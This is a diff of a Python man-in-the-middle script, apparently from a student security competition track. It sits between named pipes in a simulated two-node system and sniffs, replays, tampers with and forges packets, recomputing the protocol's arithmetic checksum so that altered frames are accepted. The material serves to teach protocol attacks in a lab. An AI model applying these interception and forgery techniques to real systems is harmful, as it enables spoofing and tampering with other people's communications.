@@ -1,116 +1,201 @@
 #!/usr/bin/env python3
+
 import os
 import sys
 import struct
+import binascii
+import time
 import argparse
 
-# 272 Bytes total due to standard 1-byte structural padding before length field
-PACKET_SIZE = 272
-# Structure Layout: Little-Endian
-# I=Header(4), B=srcID(1), B=destID(1), B=type(1), x=Padding(1), H=length(2), 256s=payload(256), H=checksum(2), I=seq(4)
-STRUCT_FORMAT = "<I B B B x H 256s H I"
-MAGIC_HEADER = 0xABCD1234
-
+# Named pipe paths matching your simulation topography
 PIPE_IN = "/tmp/nodeA_to_attacker"
 PIPE_OUT = "/tmp/attacker_to_nodeB"
 
-def calculate_checksum(payload_bytes, length):
-    """Calculates arithmetic sum checksum exactly matching sender.c logic."""
-    checksum = 0
-    for i in range(min(length, len(payload_bytes))):
-        checksum += payload_bytes[i]
-    return checksum & 0xFFFF
+# --- UPDATED PROTOCOL STRUCT SPECIFICATION (Matches new packet.h Contract) ---
+# Layout: Little-Endian (<)
+# Header (4B 'I') | srcID (1B 'B') | destID (1B 'B') | Type (1B 'B') | Pad (1B 'x')
+# Length (2B 'H') | Payload (256B '256s') | Checksum (2B 'H') | Seq (4B 'I')
+PACKET_FORMAT = '<IBBBxH256sHI'
+PACKET_SIZE = struct.calcsize(PACKET_FORMAT)  # Evaluates exactly to 272 bytes
 
-def process_packet(raw_data, mode, target_str, replace_str):
-    if len(raw_data) < PACKET_SIZE:
-        return raw_data
 
-    # Unpack binary data structure
-    header, src_id, dest_id, p_type, length, payload, checksum, seq = struct.unpack(STRUCT_FORMAT, raw_data)
+class MitmOrchestrator:
+    def __init__(self, mode, target_str=None, replace_str=None, inject_msg=None):
+        self.mode = mode
+        self.target_str = target_str
+        self.replace_str = replace_str
+        self.inject_msg = inject_msg
+        self.replay_cache = []  # In-memory storage for capturing valid frames
 
-    if header != MAGIC_HEADER:
-        print("[-] Intercepted Malformed/Unknown Packet Block.")
-        return raw_data
+    def compute_crc32(self, data_bytes):
+        """Computes unsigned 32-bit CRC checksum for logging telemetry."""
+        return binascii.crc32(data_bytes) & 0xFFFFFFFF
 
-    # Clean the payload string representation
-    clean_payload = payload[:length].decode('utf-8', errors='replace')
-    
-    print("\n" + "="*40)
-    print(f"[*] INTERCEPTED PACKET [Seq: {seq}]")
-    print("="*40)
-    print(f" • Header      : 0x{header:X}")
-    print(f" • Source ID   : {src_id}")
-    print(f" • Dest ID     : {dest_id}")
-    print(f" • Type        : {p_type}")
-    print(f" • Length      : {length}")
-    print(f" • Payload     : '{clean_payload}'")
-    print(f" • Old Checksum: {checksum}")
-    
-    modified = False
+    def compute_arithmetic_checksum(self, payload_bytes, length):
+        """Computes 16-bit arithmetic sum checksum matching sender.c logic."""
+        checksum = 0
+        for i in range(min(length, len(payload_bytes))):
+            checksum += payload_bytes[i]
+        return checksum & 0xFFFF
 
-    # Perform active Tampering/Modification if requested
-    if mode == "tamper" and target_str and replace_str:
-        if target_str in clean_payload:
-            clean_payload = clean_payload.replace(target_str, replace_str)
-            payload_bytes = clean_payload.encode('utf-8')
-            length = len(payload_bytes)
-            
-            # Pad payload array up to 256 bytes
-            payload = payload_bytes.ljust(256, b'\x00')
-            
-            # CRITICAL: Recalculate checksum so Receiver accepts the tampered data
-            checksum = calculate_checksum(payload, length)
-            modified = True
-            print(f"[!] TAMPER ENGAGED: Altered payload to '{clean_payload}'")
-            print(f"[!] Recalculated Checksum to: {checksum}")
+    def run(self):
+        """Launches the primary pipeline processing engine."""
+        if self.mode == "inject":
+            self.execute_standalone_injection()
+            return
 
-    if not modified:
-        print("[*] Strategy [SNIFF]: Forwarding packet unmodified.")
+        print(f"[*] Initializing Active Intercept Layer. Strategy: [{self.mode.upper()}]")
+        
+        # Verify pipe node readiness
+        if not os.path.exists(PIPE_IN) or not os.path.exists(PIPE_OUT):
+            print("[-] Infrastructure Error: Named pipes missing.")
+            sys.exit(1)
 
-    print("="*40)
+        print("[*] Opening Channel Read Target (Listening to Node A)...")
+        fd_in = os.open(PIPE_IN, os.O_RDONLY)
+        
+        print("[*] Opening Channel Write Target (Forwarding to Node B)...")
+        fd_out = os.open(PIPE_OUT, os.O_WRONLY)
+        
+        print("[+] Proxy routing channels engaged seamlessly.\n")
 
-    # Repack into modified/unmodified 272-byte structural configuration
-    return struct.pack(STRUCT_FORMAT, header, src_id, dest_id, p_type, length, payload, checksum, seq)
-
-def main():
-    parser = argparse.ArgumentParser(description="RISC-V MITM Pipeline Engine")
-    parser.add_argument("--mode", choices=["sniff", "tamper"], default="sniff", help="Interception approach strategy")
-    parser.add_argument("--target", help="Substring target to look for (Tamper Mode only)")
-    parser.add_argument("--replace", help="String to inject instead (Tamper Mode only)")
-    args = parser.parse_args()
-
-    print(f"[*] Initializing Active Intercept Layer. Strategy: [{args.mode.upper()}]")
-
-    if not os.path.exists(PIPE_IN) or not os.path.exists(PIPE_OUT):
-        print("[-] Infrastructure Error: Named pipes missing. Run 'mkfifo' commands first.")
-        sys.exit(1)
-
-    print("[*] Opening Channel Read Target (Listening to Node A)...")
-    fd_in = os.open(PIPE_IN, os.O_RDONLY)
-    
-    print("[*] Opening Channel Write Target (Forwarding to Node B)...")
-    fd_out = os.open(PIPE_OUT, os.O_WRONLY)
-    
-    print("[+] Proxy routing channels engaged seamlessly.\n")
-
-    try:
         while True:
-            # Correct non-crashing system read implementation
-            raw_packet = os.read(fd_in, PACKET_SIZE)
-            if not raw_packet:
-                break # Pipe closure signature
-            
-            # Process, parse, edit, and recalculate checksum properties
-            out_packet = process_packet(raw_packet, args.mode, args.target, args.replace)
-            
-            # Transmit the data package to the receiver
-            os.write(fd_out, out_packet)
-            
-    except KeyboardInterrupt:
-        print("\n[*] Intercept Layer disconnected cleanly by administrator request.")
-    finally:
+            try:
+                # -------------------------------------------------------------
+                # FIXED STRUCTURE EXTRACTION (Matches sizeof(Packet) = 272B)
+                # -------------------------------------------------------------
+                # FIXED CRITICAL BUG: Removed broken ternary logic that forced os.open
+                raw_packet = os.read(fd_in, PACKET_SIZE)
+                if not raw_packet:
+                    print("[*] Stream terminated by Sender. Awaiting reconnection context...")
+                    os.close(fd_in)
+                    fd_in = os.open(PIPE_IN, os.O_RDONLY)
+                    continue
+
+                if len(raw_packet) < PACKET_SIZE:
+                    print(f"[-] Received incomplete frame ({len(raw_packet)}/{PACKET_SIZE} bytes). Skipping...")
+                    continue
+
+                # Unpack matching native C struct alignment layouts (8 targeted elements)
+                magic, src_id, dest_id, packet_type, payload_len, raw_payload, packet_checksum, seq = struct.unpack(PACKET_FORMAT, raw_packet)
+
+                # Isolate active cleartext data up to the validated string boundary
+                cleartext_payload = raw_payload[:payload_len].decode('utf-8', errors='ignore')
+                crc = self.compute_crc32(raw_payload[:payload_len])
+
+                # -------------------------------------------------------------
+                # ATTACK CLASS 1: PLAINTEXT SNIFFING LOGGING
+                # -------------------------------------------------------------
+                print("\033[94m" + "="*60)
+                print(f"[INTERCEPTED FRAME] Sequence Index: {seq}")
+                print(f"  ├── Magic Identifier : {hex(magic).upper()}")
+                print(f"  ├── Source Node ID   : {src_id}")
+                print(f"  ├── Destination ID   : {dest_id}")
+                print(f"  ├── Packet Type Tag  : {packet_type}")
+                print(f"  ├── Captured Data    : \"{cleartext_payload}\" ({payload_len} Bytes)")
+                print(f"  ├── Payload Checksum : {packet_checksum}")
+                print(f"  └── Telemetry CRC32  : {hex(crc).upper()}")
+                print("="*60 + "\033[0m")
+
+                # -------------------------------------------------------------
+                # ATTACK CLASS 2: REPLAY CACHING MECHANISM
+                # -------------------------------------------------------------
+                if self.mode == "replay":
+                    self.replay_cache.append(raw_packet)
+                    print(f"[+] Replay Subsystem: Cached valid 272-byte structural frame.")
+
+                # -------------------------------------------------------------
+                # ATTACK CLASS 3: PACKET TAMPERING MOTOR
+                # -------------------------------------------------------------
+                if self.mode == "tamper" and self.target_str and self.replace_str:
+                    if self.target_str in cleartext_payload:
+                        print(f"\n\033[91m[!] CRITICAL: Found match for target query token: '{self.target_str}'")
+                        
+                        # Execute string replacement transformation
+                        cleartext_payload = cleartext_payload.replace(self.target_str, self.replace_str)
+                        new_payload_bytes = cleartext_payload.encode('utf-8', errors='ignore')
+                        payload_len = len(new_payload_bytes)
+                        
+                        # Pad the byte array with nulls back to exactly 256 bytes for C struct compliance
+                        padded_payload = new_payload_bytes.ljust(256, b'\x00')
+                        
+                        # CRITICAL FIX: Recalculate structural arithmetic checksum for edited payloads
+                        packet_checksum = self.compute_arithmetic_checksum(padded_payload, payload_len)
+                        
+                        # Pack back into complete 272-byte struct format
+                        raw_packet = struct.pack(PACKET_FORMAT, magic, src_id, dest_id, packet_type, payload_len, padded_payload, packet_checksum, seq)
+                        
+                        print(f"  ├── Mutator: Swapped cleartext with string: \"{cleartext_payload}\"")
+                        print(f"  ├── Checksum Re-gen: Generated new hash constraint value: {packet_checksum}")
+                        print(f"  └── Structure Pack: Synthesized updated 272-byte frame stream.\033[0m\n")
+
+                # Emit final compliant packet structure down the channel to Node B
+                os.write(fd_out, raw_packet)
+
+                # -------------------------------------------------------------
+                # ATTACK CLASS 2: REPLAY TIME-DELAY INJECTION RUNNER
+                # -------------------------------------------------------------
+                if self.mode == "replay" and len(self.replay_cache) > 0:
+                    time.sleep(2)  # Delay injection footprint by two seconds
+                    print("\n\033[33m[!] REPLAY ATTACK EXECUTION: Re-injecting historical state frame...")
+                    os.write(fd_out, self.replay_cache[0])
+                    print("    └── [SUCCESS] Duplicate sequence packet pushed to Node B.\033[0m\n")
+                    self.replay_cache.clear()
+
+            except KeyboardInterrupt:
+                print("\n[*] Intercept routine terminated cleanly.")
+                break
+
         os.close(fd_in)
         os.close(fd_out)
 
+    def execute_standalone_injection(self):
+        """ATTACK CLASS 4: FORGED PACKET INJECTION"""
+        print(f"[*] Initializing Forged Packet Injection Engine...")
+        print(f"[*] Bypassing Node A entirely. Establishing target channel access link...")
+        
+        try:
+            fd_out = os.open(PIPE_OUT, os.O_WRONLY)
+            
+            fake_magic = 0xABCD1234  # MAGIC_HEADER macro definition inside packet.h
+            fake_src = 1
+            fake_dest = 2
+            fake_type = 1          
+            fake_seq = 1337         
+            
+            new_payload_bytes = self.inject_msg.encode('utf-8', errors='ignore')
+            payload_len = len(new_payload_bytes)
+            
+            # Pad the payload string to the fixed 256-byte constraint
+            padded_payload = new_payload_bytes.ljust(256, b'\x00')
+            
+            # CRITICAL FIX: Dynamically generate arithmetic checksum verification field for injection
+            fake_checksum = self.compute_arithmetic_checksum(padded_payload, payload_len)
+            
+            # Construct a clean binary equivalent of sizeof(Packet) (272 bytes)
+            packet = struct.pack(PACKET_FORMAT, fake_magic, fake_src, fake_dest, fake_type, payload_len, padded_payload, fake_checksum, fake_seq)
+            
+            print("\n\033[95m" + "!"*60)
+            print(f"[PACKET FORGERY DISPATCHED] Sending Unauthorized Structural Payload")
+            print(f"  ├── Forged Message Body : \"{self.inject_msg}\"")
+            print(f"  ├── Forged Checksum     : {fake_checksum}")
+            print(f"  └── Total Outflow Frame : {len(packet)} Bytes Packed")
+            print("!"*60 + "\033[0m\n")
+            
+            os.write(fd_out, packet)
+            os.close(fd_out)
+            
+        except Exception as e:
+            print(f"[-] Critical injection processing crash occurred: {e}")
+
+
 if __name__ == "__main__":
-    main()
+    parser = argparse.ArgumentParser(description="IITI SOC 2026 Track 3 Cyber Engine")
+    parser.add_argument('--mode', choices=['sniff', 'tamper', 'replay', 'inject'], required=True)
+    parser.add_argument('--target', type=str, help="Target keyword to match during tampering loops.")
+    parser.add_argument('--replace', type=str, help="Replacement text to write over target entries.")
+    parser.add_argument('--message', type=str, default="HELLO FROM NODE A", help="Data block payload for injection runs.")
+    
+    args = parser.parse_args()
+    engine = MitmOrchestrator(mode=args.mode, target_str=args.target, replace_str=args.replace, inject_msg=args.message)
+    engine.run()
